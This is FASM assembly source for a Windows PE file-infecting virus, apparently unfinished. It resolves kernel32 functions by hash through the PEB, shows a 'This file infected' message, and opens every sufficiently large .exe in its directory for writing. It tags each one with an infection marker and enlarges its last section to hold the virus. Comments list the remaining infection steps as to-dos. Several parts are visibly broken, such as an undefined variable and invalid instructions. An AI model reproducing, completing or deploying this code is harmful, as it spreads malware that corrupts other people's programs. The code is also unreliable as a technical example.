               IsSc=0
if IsSc=0
     format PE Console 4.0
   entry ShellCodeTest
else
 use32
end if

include 'win32ax.inc'

macro func name
{
  dword[ebp-name]
}

ShellCodeTest:
  jmp short EndSetStart 
  SetStart:
  mov eax,[esp]
  ret
  EndSetStart:
  pushad
  pushfd
  push ebp
  mov ebp,esp
  jmp short start
  
FindKernel32:
  mov eax, [fs:30h];PEB
  mov eax, [eax+0ch];PEB.Ldr
  mov eax, [eax+014h];PEB.InMemoryOrderModuleList.Flink
  mov eax, [eax];2 entry
  mov eax, [eax];3 entry
  mov eax, [eax+10h];kernel32
  ret

  ;kernel32 offset to new EXE header
  ; 03C d: F0
  ;export dir rva
  ;178h val dword: 4485c
 
 ;hashname, basedll 
findFunctionName:
  xor esi,esi
  push ebp
  mov ebp,esp
  sub esp,0xc
  mov ebx,[ebp+0x0C]
  mov ebx,[ebx+0x3C];
  add ebx,[ebp+0x0C]
  mov ebx,[ebx+0x78]
  add ebx,[ebp+0x0C];abs addr of exp table EXP_DIR
  
  mov eax,[ebx+0x1C]
  add eax,[ebp+0x0C]
  mov [ebp-0x4],eax
  
  mov eax,[ebx+0x20]
  add eax,[ebp+0x0C]
  mov [ebp-0x8],eax
  
  mov eax,[ebx+0x24]
  add eax,[ebp+0x0C]
  mov [ebp-0x0C],eax
  
  mov ecx,[ebx+0x14]
  mov ebx,[ebp-0x8]
  
  findFunctionLoop:
    jecxz short findFunctionFinished; ecx=0 > end
    dec ecx
    mov esi,[ebx+4*ecx]
    add esi,[ebp+0x0C]
    
    computeHash:
      xor edi,edi
      xor eax,eax
      computeHashAgain:
      lodsb
      test al,al
      jz short computeHashFinished
      ror edi,0xd
      add edi,eax
      jmp short computeHashAgain
    computeHashFinished:
    findFunctionCompare:
    cmp edi,[ebp+0x8]
    jnz short findFunctionLoop
  ;get func addr
  mov ebx,[ebp-0x0C]
  mov cx,[ebx+2*ecx]
  mov eax,[ebp-0x4]
  mov eax,[eax+ecx*4]
  add eax,[ebp+0x0C]
findFunctionFinished:
  leave
  ret



  
start:
  buf1 = 0x60
  sub esp, buf1 ;40 byte = 10 locals
  ;0x4 CreateProcessA
  CreateProcessA = 0x4
  ;0x8 LoadLibraryA
  LoadLibraryA = 0x8
  ;0x0C ExitProcess
  ExitProcess=0x0C
  ;0x10 GetProcAddress
  GetProcAddress = 0x10
  ;0x14 user32.dll                  late
  user32 = 0x14
  ;0x18 MessageBoxA                 late
  MessageBoxA = 0x18
  ;0x1C GetModuleFileNameA
  GetModuleFileNameA = 0x1C
  ;0x20 SetCurrentDirectoryA
  SetCurrentDirectoryA=0x20
  ;0x24 FindFirstFileA
  FindFirstFileA=0x24
  ;0x28 FindNextFileA
  FindNextFileA=0x28
  ;0x2C hFind                      var
  hFind=0x2C
  ;0x30 CreateFileA
  CreateFileA=0x30
  ;0x34 SetFilePointer
  SetFilePointer=0x34
  ;0x38 ReadFile
  ReadFile=0x38
  ;0x3C GetFileSize
  GetFileSize=0x3C
  ;0x40 GlobalAlloc
  GlobalAlloc=0x40
  ;0x44 CloseHandle
  CloseHandle=0x44
  ;0x48 hFile                       var
  hFile=0x48
  ;0x4C NThead
  NThead = 0x4C
  ;0x50 FileAlignment
  FileAlignment = 0x50
  ;0x54 FileSize                    var
  FileSize=0x54
  ;0x58 pAllocMem                   var
  pAllocMem=0x58
  ;0x5C BigPhysOffeset              vat
  BigPhysOffeset=0x5C
  ;0x60 BigVirtRVA                  var
  BigVirtRVA=0x60
  ;0x64 VirusSize                   var
  VirusSize=0x64
  ;0x68 WriteFile
  WriteFile =0x68
  ;0x6C real entry                  var
  RealEntry=0x6C
  ;0x70 GlobalFree
  GlobalFree=0x70
  ;0x74 FindClose
  FindClose=0x74
  ;0x78 ImageBase                  var
  ImageBase=0x78
  ;0x7C AdressOfEntryPoint         var
  AdressOfEntryPoint=0x7C
  ;0x80 VirusStartPoint            var
  VirusStartPoint=0x80
  ;0x84 UseSectionAddr             var
  UseSectionHead=0x84
                
  buf2 = 0x190
  sub esp, buf2
    ;define WIN32_FILE_DATAA 398 byte  18Eh  400  190h
  ;dw atribs      8       8 
  ;ft createtime   16      24
  ; dw lowdt       8         
  ; dw highdt      8           
  ;ft lastacces      16      40
  ;ft lastwrite        16      54   36h
  ;dw filesizehigh       8       62 3Eh
  ;dw filesizelow         8        80 50h
  ;dw res                  8         88
  ;dw res                   8          96 60h
  ;wch fname                 260 byte
  ;wch altfname                      14 byte
  ;dw filetype                              8
  ;dw creatortype                            8
  ;w finderflags                              4
;  sub esp,0x18E
;  mov ecx,esp
  WIN32_FILE_DATAA = buf1+buf2                                

  buf3 = 0x104 
   sub esp,buf3 ;260 0x104     -0x44-0x190-0x104
   Path=buf1+buf2+buf3
   ;Path
   
  SetVirStart:
  call near SetStart
  sub eax,0x9D
  mov [ebp-VirusStartPoint],eax
  
  EndSetVirStart: 
  call near FindKernel32
  push eax
  
  ;CreateProcessA
  push 0x16b3fe72; 0x2d67fce4   0x16b3fe72
  call near findFunctionName
  mov [ebp-0x4],eax
  
  ;LoadLibraryA
  mov eax,0xec0e4e8e; hash
  mov [esp],eax; arg to findFunctionName
  call near findFunctionName
  mov [ebp-0x8],eax  ;save addr
  
  ;ExitProcess
  mov eax,0x73e2d87e
  mov [esp],eax
  call near findFunctionName
  mov [ebp-0x0C],eax
  
  ;GetProcAddress
  mov eax,0x7c0dfcaa
  mov [esp],eax
  call near findFunctionName
  mov [ebp-0x10],eax
  
  ;GetModuleFileNameA
  mov eax,0x45b06d76
  mov [esp],eax
  call near findFunctionName
  mov [ebp-0x1C],eax
  
  ;SetCurrentDirectoryA
  mov eax,0xbfc7034f
  mov [esp],eax
  call near findFunctionName
  mov [ebp-0x20],eax
  
  ;FindFirstFileA
  mov eax, 0x63d6c065
  mov [esp],eax
  call near findFunctionName
  mov [ebp-0x24],eax
  
  ;FindNextFileA
  mov eax, 0xa5e1ac97
  mov [esp],eax
  call near findFunctionName
  mov [ebp-0x28],eax
  
  ;0x38 ReadFile         err
  mov eax,0x10fa6516
  mov [esp],eax
  call near findFunctionName
  mov [ebp-0x38],eax
  
  ;CreateFileA
  mov eax,0x7c0017a5
  mov [esp],eax
  call near findFunctionName
  mov [ebp-0x30],eax

  ;0x34 SetFilePointer
  mov eax,0x76da08ac
  mov [esp],eax
  call near findFunctionName
  mov [ebp-0x34],eax
  
  ;0x3C GetFileSize
  mov eax,0xdf7d9bad
  mov [esp],eax
  call near findFunctionName
  mov [ebp-0x3C],eax
  
  ;0x40 GlobalAlloc
  mov eax,0x0c0397ec
  mov [esp],eax
  call near findFunctionName
  mov [ebp-0x40],eax
    
  ;0x44 CloseHandle
  mov eax,0xffd97fb
  mov [esp],eax
  call near findFunctionName
  mov [ebp-0x44],eax

  ;0x68 WriteFile
  mov eax,0xe80a791f
  mov [esp],eax
  call near findFunctionName
  mov [ebp-WriteFile],eax
  
  ;GlobalFree
  mov eax,0x7cb922f6
  mov [esp],eax
  call near findFunctionName
  mov [ebp-GlobalFree],eax
  
  ;FindClose
  mov eax,0x23545978
  mov [esp],eax
  call near findFunctionName
  mov [ebp-FindClose],eax
  
  ;load user32
  push 0x00003233;user32
  push 0x72657375
  mov ebx,esp
  push ebx
  call dword [ebp-0x8]
  mov [ebp-0x14],eax
  add esp, 4*2
  
 ;MessageBoxA
  push 0x0041786f
  push 0x42656761
  push 0x7373654d
  mov ebx,esp
  push ebx
  mov eax,[ebp-0x14];user32
  push eax
  call dword [ebp-0x10];GetProcAddress
  mov [ebp-0x18],eax
  add esp, 4*3
  
  ;call messageBox
  push 0x00000000;"infected"
  push 0x64657463
  push 0x65666e49
  mov eax,esp
  
  
  push 0x00006465;"This file infected"
  push 0x74636566
  push 0x6e692065
  push 0x6c696620
  push 0x73696854
  mov ebx,esp
  
  push 0x00010000
  push eax
  push ebx 
  push 0
  call dword [ebp-0x18]
  add esp, 4*8
 

  ;get current directory
  ;sub esp, 260                     ;moved to top
  ;mov eax,esp
  mov eax,ebp
  sub eax,buf1+buf2+buf3
  push 100h;256
  push eax
  push 0
  call dword [ebp-0x1C]
  ;eax len
  ;esp string
  
  ;delete all after '/'
macro getPath reg
{
mov reg,ebp
sub reg,Path
}
  ;mov ebx,ebp
  ;sub ebx,Path
  getPath ebx
  add ebx,buf3
  ;add ebx,buf3
  pathStringCut:
  ;
  dec ebx
  cmp byte [ebx],0x5c;'\'
  jne short pathStringCut
  inc ebx
  mov byte[ebx],0
  ;mov edx,esp;string
  getPath ebx
  
  ;set directory
  push esp
  call dword [ebp-0x20]
  mov edx,esp;string back to reg 
  

macro getFileData reg
{
mov reg,ebp
sub reg,WIN32_FILE_DATAA
}
  ;mov ecx,ebp
  ;sub ecx, buf1+buf2
  
  
  ;find first file
  getFileData ecx
  push 0x00000065;"*.exe"
  push 0x78652e2a
  mov ebx,esp
  push ecx
  push ebx

  call dword [ebp-0x24];FindFileA
  mov [ebp-hFind],eax
  ;test Invalid_hande?
  inc eax
  jnz short OpenFile
    ;todo
  jmp short ExitPipe1
  
  nextFile:
  mov eax,[ebp-hFind]
  push ecx
  push eax
  call dword [ebp-0x28];FindNextA
  or eax,eax
  jz short ExitPipe1
  
  OpenFile:
    
    ;check atttibutes
    mov eax,[ecx]
    and eax,0x0000080;normal
    jz short nextFile
    
    ;check size
    mov eax,[ecx-0x3E]
    cmp eax,3*1024
    jl short nextFile
    
    ;todo
    ;check name != current file
  
    ;open
    push 0
    push 80h;attr normal
    push 3;open existing
    push 0
    push 3;rw
    push 0xc0000000;gen rw
    mov eax,[ecx-0x60];fname
    push eax
    call dword [ebx-0x30];CreateFileA
    inc eax    ;cant open
    jz nextFile
    dec eax ;eax hFile
    ;eax is hFile
    ;save it
    mov [ebp-hFile],eax
    
    jmp short EndExitPipe1
    ExitPipe1:
    jmp short ExitPipe2 
    EndExitPipe1:
    
    jmp short EndnextFilePipe4
    nextFilePipe4:
    jmp short nextFile
    EndnextFilePipe4:
    
    ;todo?
    ;zero win find data?
    getFileData esi
    add esi,buf2-1
    mov ecx,buf2
    .zeroWin32FileData:
    mov [esi],dword 0
    loop .zeroWin32FileData
    mov [esi],dword 0
    
   
    ;read PE
    ;read section alignment
    push 0
    push 0
    push 0x3C
    mov eax,[ebp-hFile]
    push eax
    call dword[ebp-SetFilePointer]
     
    push 0     ;overLapped
    push esp     ;null
    push 4      ;bufSize
    mov esi,ebp;buf
    sub esi,NThead
    push esi
    mov eax,[ebp-hFile];hand
    push eax
    call dword[ebp-ReadFile]
    
    jmp short EndnextFilePipe3
    nextFilePipe3:
    jmp short nextFilePipe4
    EndnextFilePipe3:
    
    ;got address of NT header.signature
    
    mov eax,[esi]
    add eax,0x38 ;SectionAlignment
    push 0
    push 0
    push eax
    mov eax,[ebp-hFile]
    push eax
    call dword[ebp-SetFilePointer]
    
    push 0
    push esp
    push 4
    mov esi,ebp
    sub esi,FileAlignment
    mov eax,[ebp-hFile]
    push eax
    call dword [ebp-ReadFile]
    
    
    jmp short EndExitPipe2
    ExitPipe2:
    jmp short ExitPipe3 
    EndExitPipe2:
    

    ;got SectionAlignment in FileAlignment 
    
    push 0
    push 0
    push 0
    mov eax,[ebp-hFile]
    push eax
    call dword[ebp-SetFilePointer]
    
    ;zero offset
    
    ;get file size
    push 0
    mov eax,[ebp-hFile]
    push eax
    call dword [ebp-GetFileSize]
    mov [ebp-FileSize],eax
    
    
    
    
    push eax
    push 0
    call dword [ebp-GlobalAlloc]
    mov [ebp-pAllocMem],eax
    
    test eax,eax
    jz short CloseFileProcPipe1
    
    
    jmp short EndnextFilePipe2
    nextFilePipe2:
    jmp short nextFilePipe3
    EndnextFilePipe2:
    
    ;read file
    push 0
    push esp
    mov eax,[ebp-FileSize]
    push eax
    mov eax,[ebp-pAllocMem]
    push eax
    mov eax,[ebp-hFile]
    push eax
    call dword [ebp-ReadFile]
    or eax,eax
    jz short CloseFileProcPipe1
    
    ;set as infect
    mov edi,ebp
    sub edi,pAllocMem
    add edi,[edi+0x3C];NTheadAddr
    mov [ebp-NThead],edi
    cmp word[edi],0x4550;sig check
    jne Exit
    
    add edi,0x4C;;Reserv
    cmp dword[edi],0x77777777;chock to infection
    
    je CloseFileProcPipe1
    
    mov dword[edi],0x77777777;set infected
    sub edi,0x4C
    
    ;find last section
    SectionSearch:
    movzx ecx,word[edi+6];num of sections
    movzx esi,word[edi+0x14];optional head size
    
    ;lea esi,[edi+esi+0x18];VA first section
    ;mov ebx,[esi+0x14];biggest PhysOffset va
    ;mov edx,[esi+0x0C];biggest VirtRVA va
    mov edi,[ebp-NThead]
    add edi,0x20
    add edi,esi;start of first section header
    mov edx,edi
    mov [ebp-UseSectionHead],edi
    
    
    jmp short EndExitPipe3
    ExitPipe3:
    jmp short Exit 
    EndExitPipe3:
    jmp short EndCloseFileProcPipe1
    CloseFileProcPipe1:
    jmp short CloseFileProc
    EndCloseFileProcPipe1:
    jmp short EndnextFilePipe1
    nextFilePipe1:
    jmp short nextFilePipe2
    EndnextFilePipe1:
    
    ;mov [ebp-BigPhysOffeset],esi ;save va
    ;mov [ebp-BigVirtRVA],esi
    mov esi,[edi+0x0C];virt off
    mov [ebp-BigVirtRVA],dword [esi]
    add esi,0x08
    mov [ebp-BigPhysOffeset],dword [esi]
    mov eax,esi
    mov esi,edi
    sub ecx,1

    SearchBigVOff:
    add edi, 0x28
    mov eax, dword[edi+0x0C]
    cmp eax,dword[ebp-BigVirtRVA]
    jle SearchBigPOff
    mov [ebp-BigVirtRVA],eax
    mov [ebp-UseSectionHead],edi
    SearchBigPOff:
    mov eax,dword[edi+0x0C+0x08]
    cmp eax,dword[ebp-BigPhysOffeset]
    jle SearchNextOff
    mov [ebp-BigPhysOffeset],eax
    mov esi,edi
    SearchNextOff:
    loop SearchBigVOff

    CheckValid:
    cmp esi,dword[ebp-UseSectionHead]
    jne CloseFileProc
    
    ;mov esi,[ebp-BigPhysOffeset];va big PysOff
    ;mov edi,[ebp-BigVirtRVA]  ;va bin VirtRVA
    ;ebx phys off of big PysOff
    ;edx VirtRAV of big VirtRVA
    
    ;check if sections same
;    CheckValid:
;    cmp esi,edi
;    jne CloseFileProc
    
    ;check last section size
    mov eax,dword[esi+0x10];raw size
    or eax,eax
    jz CloseFileProc
    ;mov edi,[ebp-pAllocMem]
;    mov edx,[esi+0x10];phys size of last section
;    or edx,edx
;    jz short CloseFileProc;if 0 close
    
    ;check sfx
;    mov eax,[esi+0x10]
    add eax,[esi+0x14]
    cmp eax,[ebp-FileSize]
    jl short CloseFileProc
    
    ;setup virus to file

    ;get image base
    mov edi,[ebp-NThead]
    add edi,0x34;ImageBase addr
    mov eax, dword [edi]
    mov [ebp-ImageBase],eax
    
    ;get AdressOfEntryPoint
    mov edi,[ebp-NThead]
    add edi,0x28
    mov eax, dword [edi]
    mov [ebp-AdressOfEntryPoint],eax
    
    ;make last section bigger
    ;find out how much spase to add
    xor eax,eax
    FindSpaceLoop:
    add eax, [ebp-FileAlignment]
    cmp eax,0x4000
    jl short FindSpaceLoop
    mov [ebp-SizeOfAdd],eax
    
    
    ;calc virt add with SectionAlignment
    xor eax,eax
    
    
    ;add to size of image
    mov edi,[ebp-NThead]
    add edi,0x50;SizeOfImage
    mov ebx,dword[edi]
    add eax,ebx
    mov [edi],eax
    
    ;add to last section size
    ;virt
    mov edi,[ebp-UseSectionHead]
    mov esi,edi
    add esi,0x0C
    mov eax,[ebp-SizeOfAdd]
    mov ebx,dword[esi]
    add ebx,eax
    mov [esi],ebx
    ;raw
    add esi, 0x8
    mov eax,[ebp-SizeOfAdd]
    mov ebx,dword[esi]
    add ebx,eax
    mov [esi],ebx
    
    
    
     
    
    
    
    
    ;todo
    ;change entypoint
    ;todo
    ;set executable flag
    ;todo
    ;write virus
    ;todo 
    ;resize Phys size and Virt size of last section +VirusSize
    ;Phys size % FileAlign
    ;virt size = Phys
    ;todo getVirus adddress to var



 
  CloseFileProc:
  mov eax,[ebp-hFile]
  push eax
  call dword [ebp-CloseHandle]
  mov eax,[ebp-pAllocMem]
  push eax
  call dword [ebp-GlobalFree]
  
  jmp short nextFilePipe1  
    
  Exit:
  mov eax,[ebp-hFind]
  push eax
  call dword [ebp-FindClose]
  
  
  
  
if IsSc=0
  pop eax
  pop eax
  add esp, 0x28
  pop ebp
  popfd
  popad
  ret
else

end if
  
if IsSc=0 
section '.idata' data readable import
  library kernel32, 'kernel32.dll',\
  msvcrt, 'msvcrt.dll'
  
  import kernel32,\
  ExitProcess, 'ExitProcess'
end if  
  
